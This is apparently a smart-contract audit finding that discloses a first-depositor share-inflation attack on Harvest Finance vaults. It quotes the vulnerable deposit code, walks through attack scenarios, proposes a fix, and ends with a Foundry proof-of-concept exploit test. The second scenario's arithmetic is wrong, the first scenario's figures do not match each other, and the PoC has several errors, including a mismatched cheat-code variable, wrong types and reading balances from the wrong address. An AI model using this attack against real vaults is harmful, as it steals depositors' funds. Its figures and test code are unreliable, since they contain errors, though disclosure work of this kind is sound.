# A malicious first depositor can manipulate price per share and steal future users' deposits for newly deployed vault.

Let's imagine a situation that new vault is just deployed by Harvest Finance.

A hacker can become first depositor of new vault and steal subsequent user's investment into new vault.

When making a deposit, depositor's share is calculated as following in `Vault.sol`.
```solidity
price per share =  
  if msg.sender == first depositor
    1
  else
    underlyingBalanceWithInvestment() / totalSupply()
```
https://github.com/harvest-finance/harvest-strategy/blob/master/contracts/base/Vault.sol#L299-L317

https://github.com/harvest-finance/harvest-strategy/blob/master/contracts/base/VaultPausable.sol#L300-L318

https://github.com/harvest-finance/harvest-strategy/blob/master/contracts/base/VaultV3.sol#L304-L322

https://github.com/harvestfi/harvest-strategy-arbitrum/blob/master/contracts/base/VaultV1.sol#L291-L308

```solidity
  function _deposit(uint256 amount, address sender, address beneficiary) internal {
    require(!paused(), "Deposits are paused");
    require(amount > 0, "Cannot deposit 0");
    require(beneficiary != address(0), "holder must be defined");

    if (address(strategy()) != address(0)) {
      require(IStrategy(strategy()).depositArbCheck(), "Too much arb");
    }

    uint256 toMint = totalSupply() == 0
        ? amount
        : amount.mul(totalSupply()).div(underlyingBalanceWithInvestment());
    _mint(beneficiary, toMint);

    IERC20(underlying()).safeTransferFrom(sender, address(this), amount);

    // update the contribution amount for the beneficiary
    emit Deposit(beneficiary, amount);
  }
```

A malicious first depositor can `deposit()` with `1 wei` of `underlying` token as the first depositor of the `Vault`, and get `1 wei` of shares.

Then the attacker can send `10000e18 - 1` of `underlying` tokens to the vault and inflate the price per share from 1.0000 to an extreme value of 10000e18 ( from `(1 + 10000e18 - 1) / 1`) .

There are two sceanarios for future depositor

- If future depositor's deposit amount >= 10000e18, e.g 20000e18 - 1

```
returned share = `1 wei` (from `19999  ether * 1 / 10000  ether`)

vault's totalSupply = 2

vault's underlying balance = 30000e18 - 1

price per share = 15000e18

attacker' profit = 5000e18

victim's loss =  5000e18
```

- Future depositor's deposit amount < 10000e18, e.g 10000e18 - 1
```
returned share = `0 wei` (from `(10000e18 - 1) / 10000  ether`)

vault's totalSupply = 1

vault's underlying balance = 20000e18 - 1

price per share = 25000e18 - 1

attacker' profit = 1000e18 - 1

victim's loss =  1000e18 - 1
```

## Impact

The attacker can profit from future users' deposits while the late users will lose part of their funds to the attacker.


## Recommendation
The fix to prevent this issue would be to enforce a minimum deposit that cannot be withdrawn. This can be done by minting small amount of vault token to `0x00` address on the first deposit.

```solidity
  function _deposit(uint256 amount, address sender, address beneficiary) internal {
    require(!paused(), "Deposits are paused");
    require(amount > 0, "Cannot deposit 0");
    require(beneficiary != address(0), "holder must be defined");

    if (address(strategy()) != address(0)) {
      require(IStrategy(strategy()).depositArbCheck(), "Too much arb");
    }

    uint256 toMint;
    if (totalSupply() == 0) {
      _mint(address(0), 1000);
      amount -= 1000;
      toMint = amount;
    }
    else {
      toMint = amount.mul(totalSupply()).div(underlyingBalanceWithInvestment());
    }
    
    _mint(beneficiary, toMint);

    IERC20(underlying()).safeTransferFrom(sender, address(this), amount);

    // update the contribution amount for the beneficiary
    emit Deposit(beneficiary, amount);
  }
```
Instead of a fixed `1000` value an admin controlled parameterized value can also be used to control the burn amount.

Another fix would be that the protocol owners perform the initial deposit themselves with a small amount of `underlying` tokens and send them to a 0x00 address.

## Proof of Concept
```solidity

// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";

contract ContractTest is DSTest {
    CheatCodes  cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    address     attacker = 0xA6AF2872176320015f8ddB2ba013B38Cb35d22Ad;
    address     victim = 0x14d8ada7a0ba91f59dc0cb97c8f44f1d177c2195;
    IERC20      underlying = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);

  function setUp() public {
    cheats.createSelectFork("mainnet"); 
  }

  function testExploit() public {
    Vault impl = new VaultV3();
    Vault vault = Vault(new VaultProxy(impl));

    cheat.startPrank(attacker);
    vault.deposit(1);
    underlying.transfer(address(vault), 10000 ether - 1);
    emit log_named_uint("Attacker's vault share", vault.balanceOf(address(this)));

    cheat.startPrank(victim);
    vault.deposit(20000 ether - 1);
    emit log_named_uint("Victim's vault share", vault.balanceOf(address(this)));

    emit log_named_uint("Attacker's profit : ", vault.underlyingBalanceWithInvestmentForHolder(attacker) - 10000 ether);
    emit log_named_uint("Victims's loss : ", 20000 ether - 1 - vault.underlyingBalanceWithInvestmentForHolder(victim));
  }
}

```